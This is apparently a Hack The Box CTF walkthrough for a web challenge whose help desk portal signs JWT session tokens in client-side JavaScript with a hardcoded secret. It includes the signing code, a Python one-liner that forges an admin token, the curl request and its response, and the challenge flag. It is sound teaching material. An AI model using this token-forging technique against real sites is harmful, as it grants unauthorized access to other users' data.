# OPENSECRET - HTB CTF Walkthrough

| Field | Value |
|---|---|
| Challenge type | Web application |
| Tech stack | Flask-style backend, vanilla JS frontend, client-generated JWT sessions |
| Flag location | Stored as ticket content, readable only via a forged admin session |
| Vulnerability chain | JWT signing secret hardcoded in client-side JavaScript |
| Flag | `HTB{0p3n_s3cr3ts_ar3_n0t_s3cr3ts}` |

---

## Key Technologies - What They Are

**JWT (JSON Web Token)** - A signed token format used for session management: `header.payload.signature`, base64url-encoded. The signature proves the payload was not tampered with, as long as the signing key is kept secret by the server.

**Web Crypto API** - A browser-native cryptography API (`crypto.subtle`). Here it is used client-side to HMAC-SHA256 sign a JWT before the user has even interacted with the page.

---

## Architecture

```
[Browser] ──→ GET /              (serves help desk portal HTML/JS)
                 │
                 └── on page load, inline <script> generates a guest JWT
                     client-side and stores it as a cookie
           ──→ POST /submit-ticket {name, description}
           ──→ GET /tickets       (returns ticket list if cookie has a valid JWT)
```

The portal is a simple support-ticket form. On every page load, a `<script>` block in the HTML runs `generateJWT()`, which builds a JWT for a random `guest_XXXX` username, signs it with HMAC-SHA256, and stores it in the `session_token` cookie. `/tickets` presumably checks this cookie server-side to authorize the response.

---

## Vulnerability Chain Summary

```
Step 1: View page source at GET / - find the JWT signing code inline
Step 2: Read the hardcoded SECRET_KEY constant used to sign it
Step 3: Forge a JWT locally for {"username": "admin"}, signed with
        the same secret
Step 4: Send the forged JWT as the session_token cookie to GET /tickets
Step 5: Admin's ticket contains the flag
```

---

## Bug - JWT Secret Shipped to the Client

**File:** inline `<script>` in the page served at `GET /`

### The signing code

```javascript
// JWT Secret Key
const SECRET_KEY = "HTB{0p3n_s3cr3ts_ar3_n0t_s3cr3ts}";

function base64url(str) {
    return btoa(str).replace(/\+/g, "-").replace(/\//g, "_").replace(/=/g, "");
}

async function generateJWT() {
    const username = "guest_" + Math.floor(Math.random() * 10000);
    const header = { alg: "HS256", typ: "JWT" };
    const payload = { username: username };

    const encodedHeader = base64url(JSON.stringify(header));
    const encodedPayload = base64url(JSON.stringify(payload));
    const data = encodedHeader + "." + encodedPayload;

    const key = await crypto.subtle.importKey(
        "raw",
        new TextEncoder().encode(SECRET_KEY),
        { name: "HMAC", hash: "SHA-256" },
        false,
        ["sign"]
    );

    const signature = await crypto.subtle.sign("HMAC", key, new TextEncoder().encode(data));
    const encodedSignature = base64url(String.fromCharCode(...new Uint8Array(signature)));
    const token = data + "." + encodedSignature;

    document.cookie = `session_token=${token}; path=/; max-age=86400`;
}

generateJWT();
```

The entire point of a JWT signature is that only the server can produce a valid one, because only the server holds the signing key. Here, the signing happens in the browser, using the Web Crypto API, with the key embedded directly in the HTML response. Every visitor receives `SECRET_KEY` in plaintext just by loading the page or viewing source - there is nothing to extract or brute force, it is handed over on request.

### Why this matters

Any client that knows the secret can produce a validly-signed JWT for any payload it wants, including `{"username": "admin"}`. If the server trusts this signature to authorize access (e.g. on `/tickets`), then session integrity is fully broken.

### Exploitation

Forge an admin token using the leaked secret:

```bash
python3 -c '
import hmac, hashlib, base64, json

def b64url(d):
    return base64.urlsafe_b64encode(d).rstrip(b"=").decode()

secret = "HTB{0p3n_s3cr3ts_ar3_n0t_s3cr3ts}"
header = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
payload = b64url(json.dumps({"username": "admin"}, separators=(",", ":")).encode())
data = f"{header}.{payload}"
sig = hmac.new(secret.encode(), data.encode(), hashlib.sha256).digest()
print(f"{data}.{b64url(sig)}")
'
```

Send it to the tickets endpoint:

```bash
curl -s -H "Cookie: session_token=<forged_jwt>" http://<target>/tickets
```

Response:

```json
{"tickets":[
  {"id":1,"name":"John Doe","username":"guest_1234","content":"I need help resetting my password..."},
  {"id":2,"name":"Jane Smith","username":"guest_5678","content":"My account shows an incorrect billing amount..."},
  {"id":3,"name":"System Admin","username":"admin","content":"INTERNAL NOTE: System maintenance scheduled. Database backup completed. Master access key for emergency recovery: HTB{0p3n_s3cr3ts_ar3_n0t_s3cr3ts}"},
  {"id":4,"name":"Paul Blake","username":"guest_9012","content":"The dashboard is loading very slowly..."},
  {"id":5,"name":"Alice Cooper","username":"guest_3456","content":"I am unable to upload files larger than 5MB..."}
]}
```

Ticket #3, authored by `admin`, contains the flag.

---

## Root Cause

Any cryptographic secret that reaches the client is no longer a secret. Session token signing must happen exclusively server-side, with the signing key kept out of any response the client can read. Generating or signing JWTs in the browser is a structural flaw regardless of how the key is obtained - even a randomly generated per-session key would still be visible to the same client trying to forge tokens for other users.

---

## Flag

```
HTB{0p3n_s3cr3ts_ar3_n0t_s3cr3ts}
```
